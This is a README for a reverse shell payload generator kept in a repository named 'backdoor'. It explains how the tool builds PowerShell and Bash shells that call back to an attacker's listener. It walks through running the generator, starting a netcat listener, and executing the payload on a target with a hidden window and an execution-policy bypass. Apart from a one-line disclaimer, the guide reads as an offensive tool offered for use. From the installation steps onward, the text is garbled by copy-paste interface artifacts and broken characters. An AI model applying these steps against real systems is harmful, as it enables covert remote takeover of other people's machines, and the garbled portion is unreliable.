## üöÄ Overview

The Reverse Shell Payload Generator is a robust and easy-to-use Python script designed for penetration testers and security enthusiasts. It simplifies the process of creating custom reverse shell payloads for both Windows (PowerShell) and Linux/Unix (Bash) environments. By automating the generation of these critical tools, it allows for quicker setup of listening posts during ethical hacking engagements.

## ‚ú® Features

*   **Cross-Platform Payload Generation:** Generates highly effective reverse shells for diverse operating systems.
    *   **Windows:** PowerShell-based (`shell.ps1`) for reliable execution.
    *   **Linux/Unix/macOS:** Bash-based (`bash.sh`) for broad compatibility.
*   **Automated Executability:** Automatically sets execute permissions for the Bash script, streamlining deployment.
*   **Clear Listener Instructions:** Provides immediate guidance on how to set up your Netcat listener, ensuring a smooth workflow.
*   **Customizable:** Payloads are dynamically generated based on user-provided LHOST (Local Host IP) and LPORT (Local Port).

## üí° How It Works

The script operates by taking two essential inputs from the user: your attacking machine's IP address (LHOST) and the port you wish to listen on (LPORT).

1.  **PowerShell Payload (`shell.ps1`):** For Windows targets, a PowerShell script is crafted. This script initiates a TCP connection to your specified LHOST and LPORT. Once connected, it enters a loop to continuously receive commands from your listener, execute them locally on the Windows machine, and relay the command output back over the established TCP stream.
2.  **Bash Payload (`bash.sh`):** For Linux/Unix-like targets, a Bash script is created. This script employs I/O redirection to pipe the standard input, output, and error streams of an interactive Bash shell directly through a TCP connection to your LHOST and LPORT, effectively granting you remote command execution.

## üíª Supported Operating Systems

*   **Generator Script (`reverse_shell_generator.py`):**
    *   Works flawlessly on any system with Python 3 installed:
        *   Windows
        *   Linux (Ubuntu, Debian, Fedora, Arch, etc.)
        *   macOS
        *   Termux (Android)
*   **Generated Payloads:**
    *   `shell.ps1`: Exclusively designed for **Windows** operating systems.
    *   `bash.sh`: Compatible with **Linux/Unix-like** operating systems, including macOS and Android (via Termux).

## üì± Termux Compatibility (Android)

Great news for mobile penetration testers!

*   The **generator script (`reverse_shell_generator.py`) can be executed directly within Termux** on Android devices, allowing you to generate payloads on the go.
    *   **Prerequisite:** Install Python in Termux: `pkg install python`
    *   **Execution:** `python reverse_shell_generator.py`
*   **Regarding the generated payloads:**
    *   `shell.ps1` (PowerShell) **will NOT function on Termux/Android**, as PowerShell is not a native component of these environments.
    *   `bash.sh` (Bash) **WILL work on Termux/Android**. You can use it to establish a reverse shell *from* your Termux environment *to* your listener. Ensure your `LHOST` is reachable from your Termux device and `LPORT` matches your listener port.

## ‚öôÔ∏è Installation & Usage Guide

Follow these detailed steps to get started with the Reverse Shell Payload Generator.

### Step 1: Clone the Repository

First, open your terminal or command prompt and clone the repository from GitHub.

**Command:**

```bash
git clone https://github.com/rahadhasan666/backdoor.git
  This command will download the project files into a new directory named backdoor in your current working directory.<!-- IMAGE: Screenshot of the `git clone` command execution in a terminal. -->Step 2: Navigate into the Project DirectoryChange your current directory to the newly cloned backdoor repository.Command: code Bashdownloadcontent_copyexpand_lessIGNORE_WHEN_COPYING_STARTIGNORE_WHEN_COPYING_END    cd backdoor
  <!-- IMAGE: Screenshot of the `cd backdoor` command execution, showing the prompt changing. -->Step 3: Ensure Python 3 is InstalledThis script requires Python 3. You can verify your Python version:Command (Linux/macOS/Termux): code Bashdownloadcontent_copyexpand_lessIGNORE_WHEN_COPYING_STARTIGNORE_WHEN_COPYING_END    python3 --version
  Command (Windows Command Prompt/PowerShell): code Cmddownloadcontent_copyexpand_lessIGNORE_WHEN_COPYING_STARTIGNORE_WHEN_COPYING_END    python --version
  If Python 3 is not installed, please download it from python.org or use your system's package manager:Debian/Ubuntu: sudo apt update && sudo apt install python3Fedora/RHEL: sudo dnf install python3Arch Linux: sudo pacman -S pythonStep 4: Run the Generator ScriptNow, execute the reverse_shell_generator.py script.Command (Linux/macOS/Termux): code Bashdownloadcontent_copyexpand_lessIGNORE_WHEN_COPYING_STARTIGNORE_WHEN_COPYING_END    python3 reverse_shell_generator.py
  Command (Windows Command Prompt/PowerShell): code Cmddownloadcontent_copyexpand_lessIGNORE_WHEN_COPYING_STARTIGNORE_WHEN_COPYING_END    python reverse_shell_generator.py
  The script will prompt you to enter your LHOST (your attacking machine's IP address) and LPORT (the port you'll use for listening).Example Interaction: code Codedownloadcontent_copyexpand_lessIGNORE_WHEN_COPYING_STARTIGNORE_WHEN_COPYING_END    [+] Reverse Shell Payload Generator
[*] Enter your IP address and port to generate the payloads
set lhost: 192.168.1.100  # Replace with your actual IP
set lport: 4444         # Choose your desired port
  <!-- IMAGE: Screenshot of the script running, showing the prompts for LHOST and LPORT, and the user input. -->Step 5: Output and Next StepsUpon successful execution, the script will generate two files (shell.ps1 and bash.sh) and provide instructions for the next steps: code Codedownloadcontent_copyexpand_lessIGNORE_WHEN_COPYING_STARTIGNORE_WHEN_COPYING_END    [+] PowerShell payload written to shell.ps1
[+] Bash payload written to bash.sh
[+] Start listener with: nc -lvnp 4444
[!] Execute shell.ps1 on Windows or bash.sh on Linux to get reverse shell
  Step 6: Start Your Netcat ListenerCRITICAL: Before deploying any payload, you MUST set up a listener on your attacking machine (LHOST) to catch the incoming shell connection.Command (Linux/macOS/Termux): code Bashdownloadcontent_copyexpand_lessIGNORE_WHEN_COPYING_STARTIGNORE_WHEN_COPYING_END    nc -lvnp <YOUR_LPORT>
# Example: nc -lvnp 4444
  Command (Windows using Netcat for Windows):You might need to download a Netcat binary for Windows. code Cmddownloadcontent_copyexpand_lessIGNORE_WHEN_COPYING_STARTIGNORE_WHEN_COPYING_END    nc.exe -lvnp <YOUR_LPORT>
# Example: nc.exe -lvnp 4444
  nc: Netcat utility-l: Listen mode (tells Netcat to listen for incoming connections)-v: Verbose output (provides more information)-n: Numeric-only IP addresses (prevents DNS lookups, speeding up connection)-p: Specifies the port to listen on<!-- IMAGE: Screenshot of a Netcat listener running, showing it waiting for a connection. -->Step 7: Execute Payloads on Target SystemTransfer the appropriate generated payload to your target system and execute it.üéØ On a Windows Target:Transfer shell.ps1 to the Windows machine (e.g., via a web server, USB drive, etc.).Execute it via PowerShell. For more discreet execution or to bypass some restrictions, you might use:Command (PowerShell): code Powershelldownloadcontent_copyexpand_lessIGNORE_WHEN_COPYING_STARTIGNORE_WHEN_COPYING_END    powershell.exe -File shell.ps1
  Command (from Command Prompt cmd.exe): code Cmddownloadcontent_copyexpand_lessIGNORE_WHEN_COPYING_STARTIGNORE_WHEN_COPYING_END    powershell.exe -NoP -NonI -W Hidden -Exec Bypass -File shell.ps1
  -NoP: No Profile-NonI: Non Interactive-W Hidden: Window Style Hidden (runs without showing a window)-Exec Bypass: Execution Policy Bypass (allows unsigned scripts to run)(Note: Bypassing execution policies might require administrative privileges or specific system configurations. Always understand the context of the target system.)<!-- IMAGE: Screenshot of a Windows command prompt or PowerShell window executing `shell.ps1`. -->üêß On a Linux/Unix/macOS/Termux Target:Transfer bash.sh to the target machine.Execute it directly. The script already handles making bash.sh executable.Command: code Bashdownloadcontent_copyexpand_lessIGNORE_WHEN_COPYING_STARTIGNORE_WHEN_COPYING_END    ./bash.sh
  <!-- IMAGE: Screenshot of a Linux terminal executing `bash.sh`. -->‚ö†Ô∏è Important NoteThis tool is strictly intended for educational purposes, ethical hacking, and authorized penetration testing only.
